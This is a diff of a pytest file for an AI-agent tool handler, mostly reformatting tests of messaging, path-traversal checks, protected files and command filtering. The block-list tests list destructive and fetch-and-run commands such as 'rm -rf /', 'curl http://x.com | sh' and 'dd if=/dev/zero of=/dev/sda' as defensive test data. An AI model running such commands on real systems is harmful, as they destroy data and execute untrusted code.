@@ -7,7 +7,7 @@ from __future__ import annotations
 
 import json
 from pathlib import Path
-from unittest.mock import AsyncMock, MagicMock, patch
+from unittest.mock import MagicMock, patch
 
 import pytest
 
@@ -18,7 +18,6 @@ from core.tooling.handler import (
     _NEEDS_SHELL_RE,
     _error_result,
     _EPISODE_FILENAME_RE,
-    _PROTECTED_FILES,
     _is_protected_write,
     _validate_episode_path,
     _READ_FILE_SAFETY_NOTICE,
@@ -90,7 +89,9 @@ def handler(anima_dir: Path, memory: MagicMock) -> ToolHandler:
 
 @pytest.fixture
 def handler_with_messenger(
-    anima_dir: Path, memory: MagicMock, messenger: MagicMock,
+    anima_dir: Path,
+    memory: MagicMock,
+    messenger: MagicMock,
 ) -> ToolHandler:
     return ToolHandler(
         anima_dir=anima_dir,
@@ -153,7 +154,9 @@ class TestHandleRouting:
         assert "File not found" in result
 
     def test_read_memory_file_common_knowledge_prefix(
-        self, handler: ToolHandler, tmp_path: Path,
+        self,
+        handler: ToolHandler,
+        tmp_path: Path,
     ):
         """read_memory_file with common_knowledge/ prefix resolves to shared dir."""
         ck_dir = tmp_path / "ck"
@@ -164,12 +167,15 @@ class TestHandleRouting:
             return_value=ck_dir,
         ):
             result = handler.handle(
-                "read_memory_file", {"path": "common_knowledge/policy.md"},
+                "read_memory_file",
+                {"path": "common_knowledge/policy.md"},
             )
         assert result == "shared content"
 
     def test_read_memory_file_common_knowledge_not_found(
-        self, handler: ToolHandler, tmp_path: Path,
+        self,
+        handler: ToolHandler,
+        tmp_path: Path,
     ):
         """read_memory_file with common_knowledge/ prefix for missing file."""
         ck_dir = tmp_path / "ck_empty"
@@ -179,7 +185,8 @@ class TestHandleRouting:
             return_value=ck_dir,
         ):
             result = handler.handle(
-                "read_memory_file", {"path": "common_knowledge/missing.md"},
+                "read_memory_file",
+                {"path": "common_knowledge/missing.md"},
             )
         assert "File not found" in result
 
@@ -208,48 +215,63 @@ class TestHandleRouting:
         assert "Error" in result
 
     def test_send_message_with_messenger(
-        self, handler_with_messenger: ToolHandler, anima_dir: Path,
+        self,
+        handler_with_messenger: ToolHandler,
+        anima_dir: Path,
     ):
         alice_dir = anima_dir.parent / "alice"
         alice_dir.mkdir(exist_ok=True)
         with patch("core.paths.get_animas_dir", return_value=anima_dir.parent):
             result = handler_with_messenger.handle(
-                "send_message", {"to": "alice", "content": "hello", "intent": "report"},
+                "send_message",
+                {"to": "alice", "content": "hello", "intent": "report"},
             )
         assert "Message sent to alice" in result
         assert "alice" in handler_with_messenger.replied_to
 
     def test_send_message_with_intent(
-        self, handler_with_messenger: ToolHandler, anima_dir: Path,
+        self,
+        handler_with_messenger: ToolHandler,
+        anima_dir: Path,
     ):
         alice_dir = anima_dir.parent / "alice"
         alice_dir.mkdir(exist_ok=True)
         with patch("core.paths.get_animas_dir", return_value=anima_dir.parent):
             result = handler_with_messenger.handle(
-                "send_message", {"to": "alice", "content": "hello", "intent": "delegation"},
+                "send_message",
+                {"to": "alice", "content": "hello", "intent": "delegation"},
             )
         assert "Message sent to alice" in result
         handler_with_messenger._messenger.send.assert_called_once_with(
-            to="alice", content="hello", thread_id="", reply_to="", intent="delegation",
+            to="alice",
+            content="hello",
+            thread_id="",
+            reply_to="",
+            intent="delegation",
             origin_chain=["anima"],
         )
 
     def test_send_message_intent_empty_returns_error(
-        self, handler_with_messenger: ToolHandler, anima_dir: Path,
+        self,
+        handler_with_messenger: ToolHandler,
+        anima_dir: Path,
     ):
         """Empty intent (no intent provided) is rejected by the new DM restriction."""
         alice_dir = anima_dir.parent / "alice"
         alice_dir.mkdir(exist_ok=True)
         with patch("core.paths.get_animas_dir", return_value=anima_dir.parent):
             result = handler_with_messenger.handle(
-                "send_message", {"to": "alice", "content": "hello"},
+                "send_message",
+                {"to": "alice", "content": "hello"},
             )
         assert "Error" in result
         assert "intent" in result
         handler_with_messenger._messenger.send.assert_not_called()
 
     def test_send_message_invalid_intent_returns_error(
-        self, handler_with_messenger: ToolHandler, anima_dir: Path,
+        self,
+        handler_with_messenger: ToolHandler,
+        anima_dir: Path,
     ):
         """Intent that is not 'report' or 'delegation' is rejected."""
         alice_dir = anima_dir.parent / "alice"
@@ -257,14 +279,17 @@ class TestHandleRouting:
         long_intent = "x" * 100
         with patch("core.paths.get_animas_dir", return_value=anima_dir.parent):
             result = handler_with_messenger.handle(
-                "send_message", {"to": "alice", "content": "hello", "intent": long_intent},
+                "send_message",
+                {"to": "alice", "content": "hello", "intent": long_intent},
             )
         assert "Error" in result
         assert "intent" in result
         handler_with_messenger._messenger.send.assert_not_called()
 
     def test_send_message_calls_on_message_sent(
-        self, handler_with_messenger: ToolHandler, anima_dir: Path,
+        self,
+        handler_with_messenger: ToolHandler,
+        anima_dir: Path,
     ):
         callback = MagicMock()
         handler_with_messenger.on_message_sent = callback
@@ -272,12 +297,15 @@ class TestHandleRouting:
         alice_dir.mkdir(exist_ok=True)
         with patch("core.paths.get_animas_dir", return_value=anima_dir.parent):
             handler_with_messenger.handle(
-                "send_message", {"to": "alice", "content": "hello", "intent": "report"},
+                "send_message",
+                {"to": "alice", "content": "hello", "intent": "report"},
             )
         callback.assert_called_once_with("test-anima", "alice", "hello")
 
     def test_send_message_on_message_sent_error_swallowed(
-        self, handler_with_messenger: ToolHandler, anima_dir: Path,
+        self,
+        handler_with_messenger: ToolHandler,
+        anima_dir: Path,
     ):
         callback = MagicMock(side_effect=RuntimeError("boom"))
         handler_with_messenger.on_message_sent = callback
@@ -286,29 +314,36 @@ class TestHandleRouting:
         with patch("core.paths.get_animas_dir", return_value=anima_dir.parent):
             # Should not raise
             result = handler_with_messenger.handle(
-                "send_message", {"to": "alice", "content": "hello", "intent": "report"},
+                "send_message",
+                {"to": "alice", "content": "hello", "intent": "report"},
             )
         assert "Message sent" in result
 
     def test_send_message_duplicate_recipient_returns_error(
-        self, handler_with_messenger: ToolHandler, anima_dir: Path,
+        self,
+        handler_with_messenger: ToolHandler,
+        anima_dir: Path,
     ):
         """Sending a second message to the same recipient returns an error."""
         alice_dir = anima_dir.parent / "alice"
         alice_dir.mkdir(exist_ok=True)
         with patch("core.paths.get_animas_dir", return_value=anima_dir.parent):
             result1 = handler_with_messenger.handle(
-                "send_message", {"to": "alice", "content": "first", "intent": "report"},
+                "send_message",
+                {"to": "alice", "content": "first", "intent": "report"},
             )
             assert "Message sent to alice" in result1
             result2 = handler_with_messenger.handle(
-                "send_message", {"to": "alice", "content": "second", "intent": "report"},
+                "send_message",
+                {"to": "alice", "content": "second", "intent": "report"},
             )
         assert "Error" in result2
         assert "alice" in result2
 
     def test_send_message_max_recipients_returns_error(
-        self, handler_with_messenger: ToolHandler, anima_dir: Path,
+        self,
+        handler_with_messenger: ToolHandler,
+        anima_dir: Path,
     ):
         """After sending to 2 recipients, a 3rd recipient is rejected."""
         alice_dir = anima_dir.parent / "alice"
@@ -319,21 +354,26 @@ class TestHandleRouting:
         charlie_dir.mkdir(exist_ok=True)
         with patch("core.paths.get_animas_dir", return_value=anima_dir.parent):
             result1 = handler_with_messenger.handle(
-                "send_message", {"to": "alice", "content": "hi", "intent": "report"},
+                "send_message",
+                {"to": "alice", "content": "hi", "intent": "report"},
             )
             assert "Message sent to alice" in result1
             result2 = handler_with_messenger.handle(
-                "send_message", {"to": "bob", "content": "hi", "intent": "report"},
+                "send_message",
+                {"to": "bob", "content": "hi", "intent": "report"},
             )
             assert "Message sent to bob" in result2
             result3 = handler_with_messenger.handle(
-                "send_message", {"to": "charlie", "content": "hi", "intent": "report"},
+                "send_message",
+                {"to": "charlie", "content": "hi", "intent": "report"},
             )
         assert "Error" in result3
         assert "2" in result3
 
     def test_send_message_two_recipients_allowed(
-        self, handler_with_messenger: ToolHandler, anima_dir: Path,
+        self,
+        handler_with_messenger: ToolHandler,
+        anima_dir: Path,
     ):
         """Sending to two different recipients should both succeed."""
         alice_dir = anima_dir.parent / "alice"
@@ -342,10 +382,12 @@ class TestHandleRouting:
         bob_dir.mkdir(exist_ok=True)
         with patch("core.paths.get_animas_dir", return_value=anima_dir.parent):
             result1 = handler_with_messenger.handle(
-                "send_message", {"to": "alice", "content": "hi", "intent": "report"},
+                "send_message",
+                {"to": "alice", "content": "hi", "intent": "report"},
             )
             result2 = handler_with_messenger.handle(
-                "send_message", {"to": "bob", "content": "hi", "intent": "report"},
+                "send_message",
+                {"to": "bob", "content": "hi", "intent": "report"},
             )
         assert "Message sent to alice" in result1
         assert "Message sent to bob" in result2
@@ -405,10 +447,10 @@ class TestFileOperations:
     def test_read_file_budget_calculation(self, anima_dir: Path, memory: MagicMock):
         """Verify budget for various context window sizes."""
         cases = [
-            (8_000, 50, 2_400),       # floor applied
+            (8_000, 50, 2_400),  # floor applied
             (32_000, 120, 9_600),
             (128_000, 480, 38_400),
-            (200_000, 500, 60_000),    # ceil applied
+            (200_000, 500, 60_000),  # ceil applied
         ]
         for ctx, expected_lines, expected_chars in cases:
             h = ToolHandler(anima_dir=anima_dir, memory=memory, context_window=ctx)
@@ -445,7 +487,7 @@ class TestFileOperations:
         long_line = "A" * 600
         (anima_dir / "long.txt").write_text(long_line, encoding="utf-8")
         result = handler.handle("read_file", {"path": str(anima_dir / "long.txt")})
-        assert f"…(+100 chars)" in result
+        assert "…(+100 chars)" in result
         assert "A" * _READ_MAX_LINE_CHARS in result
 
     def test_read_file_empty_file(self, handler: ToolHandler, anima_dir: Path):
@@ -603,7 +645,8 @@ class TestExecuteCommand:
     def test_command_timeout(self, handler: ToolHandler, memory: MagicMock):
         memory.read_permissions.return_value = "## コマンド実行\n- sleep: OK"
         result = handler.handle(
-            "execute_command", {"command": "sleep 999", "timeout": 1},
+            "execute_command",
+            {"command": "sleep 999", "timeout": 1},
         )
         parsed = json.loads(result)
         assert parsed["error_type"] == "Timeout"
@@ -630,7 +673,10 @@ class TestFilePermissions:
         assert parsed["error_type"] == "PermissionDenied"
 
     def test_allowed_path_in_whitelist(
-        self, handler: ToolHandler, memory: MagicMock, tmp_path: Path,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
+        tmp_path: Path,
     ):
         allowed_dir = tmp_path / "allowed"
         allowed_dir.mkdir()
@@ -742,35 +788,44 @@ class TestCommandPermissions:
 
 
 class TestInjectionRe:
-    @pytest.mark.parametrize("cmd", [
-        "ls; echo hi",
-        "echo `whoami`",
-        "echo $(id)",
-        "echo ${PATH}",
-        "echo $HOME",
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "ls; echo hi",
+            "echo `whoami`",
+            "echo $(id)",
+            "echo ${PATH}",
+            "echo $HOME",
+        ],
+    )
     def test_detects_injection(self, cmd: str):
         assert _INJECTION_RE.search(cmd)
 
-    @pytest.mark.parametrize("cmd", [
-        "git status --short",
-        "echo 'hello world'",
-        "ps aux | grep python",
-        "df -h | head -5",
-        "ls -la && echo done",
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "git status --short",
+            "echo 'hello world'",
+            "ps aux | grep python",
+            "df -h | head -5",
+            "ls -la && echo done",
+        ],
+    )
     def test_safe_commands_pass(self, cmd: str):
         assert _INJECTION_RE.search(cmd) is None
 
 
 class TestNeedsShellRe:
-    @pytest.mark.parametrize("cmd", [
-        "ps aux | grep Z",
-        "echo hello && date",
-        "cmd1 || cmd2",
-        "echo hi > /tmp/out.txt",
-        "cat < input.txt",
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "ps aux | grep Z",
+            "echo hello && date",
+            "cmd1 || cmd2",
+            "echo hi > /tmp/out.txt",
+            "cat < input.txt",
+        ],
+    )
     def test_detects_shell_operators(self, cmd: str):
         assert _NEEDS_SHELL_RE.search(cmd)
 
@@ -779,20 +834,23 @@ class TestNeedsShellRe:
 
 
 class TestBlockedCmdPatterns:
-    @pytest.mark.parametrize("cmd,should_block", [
-        ("rm -rf /", True),
-        ("rm -r /tmp/foo", True),
-        ("rm file.txt", False),
-        ("curl http://x.com | sh", True),
-        ("curl http://x.com | bash", True),
-        ("wget http://x.com | sh", True),
-        ("curl http://x.com -o file", False),
-        ("mkfs.ext4 /dev/sda1", True),
-        ("dd if=/dev/zero of=/dev/sda", True),
-        ("dd if=input.img of=output.img", False),
-        ("shutdown -h now", True),
-        ("reboot", True),
-    ])
+    @pytest.mark.parametrize(
+        "cmd,should_block",
+        [
+            ("rm -rf /", True),
+            ("rm -r /tmp/foo", True),
+            ("rm file.txt", False),
+            ("curl http://x.com | sh", True),
+            ("curl http://x.com | bash", True),
+            ("wget http://x.com | sh", True),
+            ("curl http://x.com -o file", False),
+            ("mkfs.ext4 /dev/sda1", True),
+            ("dd if=/dev/zero of=/dev/sda", True),
+            ("dd if=input.img of=output.img", False),
+            ("shutdown -h now", True),
+            ("reboot", True),
+        ],
+    )
     def test_blocked_patterns(self, cmd: str, should_block: bool):
         matched = any(p.search(cmd) for p, _ in _BLOCKED_CMD_PATTERNS)
         assert matched == should_block, f"cmd={cmd!r} expected block={should_block}"
@@ -823,7 +881,8 @@ class TestErrorResult:
 
     def test_with_all_fields(self):
         result = _error_result(
-            "PermissionDenied", "denied",
+            "PermissionDenied",
+            "denied",
             context={"allowed_dirs": ["/tmp"]},
             suggestion="Check permissions",
         )
@@ -944,7 +1003,8 @@ class TestStructuredErrors:
     def test_command_timeout_structured(self, handler: ToolHandler, memory: MagicMock):
         memory.read_permissions.return_value = "## コマンド実行\n- sleep: OK"
         result = handler.handle(
-            "execute_command", {"command": "sleep 999", "timeout": 1},
+            "execute_command",
+            {"command": "sleep 999", "timeout": 1},
         )
         parsed = json.loads(result)
         assert parsed["error_type"] == "Timeout"
@@ -966,7 +1026,9 @@ class TestScheduleChangedCallback:
         assert handler.on_schedule_changed is fn
 
     def test_write_heartbeat_triggers_callback(
-        self, anima_dir: Path, memory: MagicMock,
+        self,
+        anima_dir: Path,
+        memory: MagicMock,
     ):
         callback = MagicMock()
         h = ToolHandler(
@@ -978,7 +1040,9 @@ class TestScheduleChangedCallback:
         callback.assert_called_once_with("test-anima")
 
     def test_write_cron_triggers_callback(
-        self, anima_dir: Path, memory: MagicMock,
+        self,
+        anima_dir: Path,
+        memory: MagicMock,
     ):
         callback = MagicMock()
         h = ToolHandler(
@@ -990,7 +1054,9 @@ class TestScheduleChangedCallback:
         callback.assert_called_once_with("test-anima")
 
     def test_write_other_file_does_not_trigger_callback(
-        self, anima_dir: Path, memory: MagicMock,
+        self,
+        anima_dir: Path,
+        memory: MagicMock,
     ):
         callback = MagicMock()
         h = ToolHandler(
@@ -1002,7 +1068,9 @@ class TestScheduleChangedCallback:
         callback.assert_not_called()
 
     def test_callback_error_does_not_break_write(
-        self, anima_dir: Path, memory: MagicMock,
+        self,
+        anima_dir: Path,
+        memory: MagicMock,
     ):
         callback = MagicMock(side_effect=RuntimeError("reload failed"))
         h = ToolHandler(
@@ -1027,13 +1095,18 @@ class TestScheduleChangedCallback:
 class TestMemoryWriteSecurity:
     """Tests for protected file and path traversal checks in memory tools."""
 
-    @pytest.mark.parametrize("protected_file", [
-        "permissions.md",
-        "identity.md",
-        "bootstrap.md",
-    ])
+    @pytest.mark.parametrize(
+        "protected_file",
+        [
+            "permissions.md",
+            "identity.md",
+            "bootstrap.md",
+        ],
+    )
     def test_write_memory_file_blocked_for_protected(
-        self, handler: ToolHandler, protected_file: str,
+        self,
+        handler: ToolHandler,
+        protected_file: str,
     ):
         result = handler.handle(
             "write_memory_file",
@@ -1044,7 +1117,9 @@ class TestMemoryWriteSecurity:
         assert "protected file" in parsed["message"]
 
     def test_write_memory_file_allowed_for_non_protected(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         result = handler.handle(
             "write_memory_file",
@@ -1056,7 +1131,9 @@ class TestMemoryWriteSecurity:
         assert written.startswith("---")  # auto-frontmatter
 
     def test_write_memory_file_path_traversal_blocked(
-        self, handler: ToolHandler, tmp_path: Path,
+        self,
+        handler: ToolHandler,
+        tmp_path: Path,
     ):
         # Create another anima's directory
         other = tmp_path / "animas" / "other-anima" / "knowledge"
@@ -1072,7 +1149,9 @@ class TestMemoryWriteSecurity:
         assert not (other / "stolen.md").exists()
 
     def test_read_memory_file_path_traversal_blocked(
-        self, handler: ToolHandler, tmp_path: Path,
+        self,
+        handler: ToolHandler,
+        tmp_path: Path,
     ):
         # Create another anima's directory with a file
         other = tmp_path / "animas" / "other-anima"
@@ -1087,7 +1166,9 @@ class TestMemoryWriteSecurity:
         assert "outside anima directory" in parsed["message"]
 
     def test_read_memory_file_normal_access_allowed(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         (anima_dir / "episodes").mkdir(exist_ok=True)
         (anima_dir / "episodes" / "2026-02-15.md").write_text("daily log", encoding="utf-8")
@@ -1098,7 +1179,9 @@ class TestMemoryWriteSecurity:
         assert result == "daily log"
 
     def test_write_memory_file_heartbeat_still_allowed(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         """heartbeat.md is NOT in the protected list."""
         result = handler.handle(
@@ -1108,7 +1191,9 @@ class TestMemoryWriteSecurity:
         assert "Written to" in result
 
     def test_write_memory_file_cron_still_allowed(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         """cron.md is NOT in the protected list."""
         result = handler.handle(
@@ -1125,10 +1210,13 @@ class TestFilePermissionWriteProtection:
     """Tests for _check_file_permission with write=True."""
 
     def test_write_to_own_permissions_md_blocked(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         result = handler._check_file_permission(
-            str(anima_dir / "permissions.md"), write=True,
+            str(anima_dir / "permissions.md"),
+            write=True,
         )
         assert result is not None
         parsed = json.loads(result)
@@ -1136,26 +1224,34 @@ class TestFilePermissionWriteProtection:
         assert "protected file" in parsed["message"]
 
     def test_write_to_own_identity_md_blocked(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         result = handler._check_file_permission(
-            str(anima_dir / "identity.md"), write=True,
+            str(anima_dir / "identity.md"),
+            write=True,
         )
         assert result is not None
         parsed = json.loads(result)
         assert parsed["error_type"] == "PermissionDenied"
 
     def test_read_permissions_md_allowed(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         """Reading protected files is allowed (write=False)."""
         result = handler._check_file_permission(
-            str(anima_dir / "permissions.md"), write=False,
+            str(anima_dir / "permissions.md"),
+            write=False,
         )
         assert result is None
 
     def test_read_permissions_md_allowed_default(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         """Default write=False should allow reading."""
         result = handler._check_file_permission(
@@ -1164,15 +1260,20 @@ class TestFilePermissionWriteProtection:
         assert result is None
 
     def test_write_to_knowledge_allowed(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         result = handler._check_file_permission(
-            str(anima_dir / "knowledge" / "note.md"), write=True,
+            str(anima_dir / "knowledge" / "note.md"),
+            write=True,
         )
         assert result is None
 
     def test_write_file_handler_blocks_protected(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         """write_file tool should block writes to permissions.md."""
         result = handler.handle(
@@ -1183,7 +1284,9 @@ class TestFilePermissionWriteProtection:
         assert parsed["error_type"] == "PermissionDenied"
 
     def test_edit_file_handler_blocks_protected(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         """edit_file tool should block edits to identity.md."""
         (anima_dir / "identity.md").write_text("original identity", encoding="utf-8")
@@ -1198,7 +1301,7 @@ class TestFilePermissionWriteProtection:
         parsed = json.loads(result)
         assert parsed["error_type"] == "PermissionDenied"
         # Verify file was NOT modified
-        assert "original identity" == (anima_dir / "identity.md").read_text(encoding="utf-8")
+        assert (anima_dir / "identity.md").read_text(encoding="utf-8") == "original identity"
 
 
 # ── Command path traversal ───────────────────────────────────
@@ -1208,7 +1311,9 @@ class TestCommandPathTraversal:
     """Tests for path traversal detection in execute_command."""
 
     def test_command_with_path_traversal_blocked(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         memory.read_permissions.return_value = "## コマンド実行\n- cp: OK"
         result = handler.handle(
@@ -1220,7 +1325,9 @@ class TestCommandPathTraversal:
         assert "outside anima directory" in parsed["message"]
 
     def test_command_without_traversal_allowed(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         memory.read_permissions.return_value = "## コマンド実行\n- echo: OK"
         result = handler.handle(
@@ -1230,7 +1337,10 @@ class TestCommandPathTraversal:
         assert "hello" in result
 
     def test_command_with_safe_dotdot_in_own_dir(
-        self, handler: ToolHandler, memory: MagicMock, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
+        anima_dir: Path,
     ):
         """Path with .. that still resolves within anima_dir should be allowed."""
         (anima_dir / "subdir").mkdir(exist_ok=True)
@@ -1282,56 +1392,49 @@ class TestToolCreationPermission:
         assert h._check_tool_creation_permission("個人ツール") is False
 
     def test_no_tool_creation_section_returns_false(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         memory.read_permissions.return_value = "## その他\n- something: yes"
         assert handler._check_tool_creation_permission("個人ツール") is False
 
     def test_personal_tool_yes(self, handler: ToolHandler, memory: MagicMock):
-        memory.read_permissions.return_value = (
-            "## ツール作成\n- 個人ツール: yes"
-        )
+        memory.read_permissions.return_value = "## ツール作成\n- 個人ツール: yes"
         assert handler._check_tool_creation_permission("個人ツール") is True
 
     def test_personal_tool_ok(self, handler: ToolHandler, memory: MagicMock):
-        memory.read_permissions.return_value = (
-            "## ツール作成\n- 個人ツール: OK"
-        )
+        memory.read_permissions.return_value = "## ツール作成\n- 個人ツール: OK"
         assert handler._check_tool_creation_permission("個人ツール") is True
 
     def test_shared_tool_yes(self, handler: ToolHandler, memory: MagicMock):
-        memory.read_permissions.return_value = (
-            "## ツール作成\n- 共有ツール: yes"
-        )
+        memory.read_permissions.return_value = "## ツール作成\n- 共有ツール: yes"
         assert handler._check_tool_creation_permission("共有ツール") is True
 
     @pytest.mark.parametrize("value", ["YES", "True", "ENABLED", "true", "Yes"])
     def test_case_insensitive(
-        self, handler: ToolHandler, memory: MagicMock, value: str,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
+        value: str,
     ):
-        memory.read_permissions.return_value = (
-            f"## ツール作成\n- 個人ツール: {value}"
-        )
+        memory.read_permissions.return_value = f"## ツール作成\n- 個人ツール: {value}"
         assert handler._check_tool_creation_permission("個人ツール") is True
 
     def test_different_kind_not_matching(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
-        memory.read_permissions.return_value = (
-            "## ツール作成\n- 共有ツール: yes"
-        )
+        memory.read_permissions.return_value = "## ツール作成\n- 共有ツール: yes"
         assert handler._check_tool_creation_permission("個人ツール") is False
 
     def test_bullet_with_asterisk(self, handler: ToolHandler, memory: MagicMock):
-        memory.read_permissions.return_value = (
-            "## ツール作成\n* 個人ツール: yes"
-        )
+        memory.read_permissions.return_value = "## ツール作成\n* 個人ツール: yes"
         assert handler._check_tool_creation_permission("個人ツール") is True
 
     def test_bullet_with_dash(self, handler: ToolHandler, memory: MagicMock):
-        memory.read_permissions.return_value = (
-            "## ツール作成\n- 個人ツール: enabled"
-        )
+        memory.read_permissions.return_value = "## ツール作成\n- 個人ツール: enabled"
         assert handler._check_tool_creation_permission("個人ツール") is True
 
 
@@ -1342,7 +1445,9 @@ class TestWriteMemoryFileToolCreation:
     """Tests for tool creation permission check in _handle_write_memory_file()."""
 
     def test_writing_tool_py_without_permission_denied(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         memory.read_permissions.return_value = "## その他\n- nothing"
         result = handler.handle(
@@ -1354,11 +1459,12 @@ class TestWriteMemoryFileToolCreation:
         assert "ツール作成" in parsed["message"]
 
     def test_writing_tool_py_with_permission_succeeds(
-        self, handler: ToolHandler, memory: MagicMock, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
+        anima_dir: Path,
     ):
-        memory.read_permissions.return_value = (
-            "## ツール作成\n- 個人ツール: yes"
-        )
+        memory.read_permissions.return_value = "## ツール作成\n- 個人ツール: yes"
         result = handler.handle(
             "write_memory_file",
             {"path": "tools/my_tool.py", "content": "print('hi')"},
@@ -1367,7 +1473,10 @@ class TestWriteMemoryFileToolCreation:
         assert (anima_dir / "tools" / "my_tool.py").read_text(encoding="utf-8") == "print('hi')"
 
     def test_writing_non_tool_file_skips_permission_check(
-        self, handler: ToolHandler, memory: MagicMock, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
+        anima_dir: Path,
     ):
         """Writing knowledge/note.md should not check tool creation permission."""
         memory.read_permissions.return_value = ""  # No permissions at all
@@ -1381,7 +1490,10 @@ class TestWriteMemoryFileToolCreation:
         assert written.startswith("---")  # auto-frontmatter
 
     def test_writing_tools_readme_not_py_skips_permission(
-        self, handler: ToolHandler, memory: MagicMock, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
+        anima_dir: Path,
     ):
         """Writing tools/readme.md (not .py) should not require tool creation permission."""
         memory.read_permissions.return_value = ""  # No permissions at all
@@ -1401,26 +1513,38 @@ class TestRefreshTools:
 
     @patch("core.tooling.handler.ExternalToolDispatcher")
     def test_no_tools_found(
-        self, _mock_cls: MagicMock, handler: ToolHandler,
+        self,
+        _mock_cls: MagicMock,
+        handler: ToolHandler,
     ):
-        with patch(
-            "core.tools.discover_personal_tools", return_value={},
-        ), patch(
-            "core.tools.discover_common_tools", return_value={},
+        with (
+            patch(
+                "core.tools.discover_personal_tools",
+                return_value={},
+            ),
+            patch(
+                "core.tools.discover_common_tools",
+                return_value={},
+            ),
         ):
             result = handler.handle("refresh_tools", {})
         assert "No personal or common tools found" in result
 
     @patch("core.tooling.handler.ExternalToolDispatcher")
     def test_discovered_tools_returned(
-        self, _mock_cls: MagicMock, handler: ToolHandler,
+        self,
+        _mock_cls: MagicMock,
+        handler: ToolHandler,
     ):
-        with patch(
-            "core.tools.discover_personal_tools",
-            return_value={"my_tool": "/path/to/my_tool.py"},
-        ), patch(
-            "core.tools.discover_common_tools",
-            return_value={"shared_util": "/path/to/shared_util.py"},
+        with (
+            patch(
+                "core.tools.discover_personal_tools",
+                return_value={"my_tool": "/path/to/my_tool.py"},
+            ),
+            patch(
+                "core.tools.discover_common_tools",
+                return_value={"shared_util": "/path/to/shared_util.py"},
+            ),
         ):
             result = handler.handle("refresh_tools", {})
         assert "my_tool" in result
@@ -1430,12 +1554,15 @@ class TestRefreshTools:
     def test_calls_update_personal_tools(self, handler: ToolHandler):
         mock_external = MagicMock()
         handler._external = mock_external
-        with patch(
-            "core.tools.discover_personal_tools",
-            return_value={"tool_a": "/a.py"},
-        ), patch(
-            "core.tools.discover_common_tools",
-            return_value={"tool_b": "/b.py"},
+        with (
+            patch(
+                "core.tools.discover_personal_tools",
+                return_value={"tool_a": "/a.py"},
+            ),
+            patch(
+                "core.tools.discover_common_tools",
+                return_value={"tool_b": "/b.py"},
+            ),
         ):
             handler.handle("refresh_tools", {})
         mock_external.update_personal_tools.assert_called_once_with(
@@ -1450,7 +1577,9 @@ class TestShareTool:
     """Tests for _handle_share_tool()."""
 
     def test_personal_tool_not_found(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         result = handler.handle("share_tool", {"tool_name": "nonexistent"})
         parsed = json.loads(result)
@@ -1458,7 +1587,10 @@ class TestShareTool:
         assert "nonexistent" in parsed["message"]
 
     def test_permission_denied_without_shared_tool_permission(
-        self, handler: ToolHandler, memory: MagicMock, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
+        anima_dir: Path,
     ):
         # Create the personal tool file so it passes the existence check
         tools_dir = anima_dir / "tools"
@@ -1472,16 +1604,18 @@ class TestShareTool:
         assert "共有ツール" in parsed["message"]
 
     def test_copies_file_when_permitted(
-        self, handler: ToolHandler, memory: MagicMock, anima_dir: Path, tmp_path: Path,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
+        anima_dir: Path,
+        tmp_path: Path,
     ):
         # Create the personal tool file
         tools_dir = anima_dir / "tools"
         tools_dir.mkdir(parents=True, exist_ok=True)
         (tools_dir / "my_tool.py").write_text("print('shared')", encoding="utf-8")
 
-        memory.read_permissions.return_value = (
-            "## ツール作成\n- 共有ツール: yes"
-        )
+        memory.read_permissions.return_value = "## ツール作成\n- 共有ツール: yes"
 
         common_dir = tmp_path / "common_tools"
         with patch("core.paths.get_data_dir", return_value=tmp_path):
@@ -1491,7 +1625,11 @@ class TestShareTool:
         assert (common_dir / "my_tool.py").read_text(encoding="utf-8") == "print('shared')"
 
     def test_error_when_common_tool_already_exists(
-        self, handler: ToolHandler, memory: MagicMock, anima_dir: Path, tmp_path: Path,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
+        anima_dir: Path,
+        tmp_path: Path,
     ):
         # Create the personal tool file
         tools_dir = anima_dir / "tools"
@@ -1503,9 +1641,7 @@ class TestShareTool:
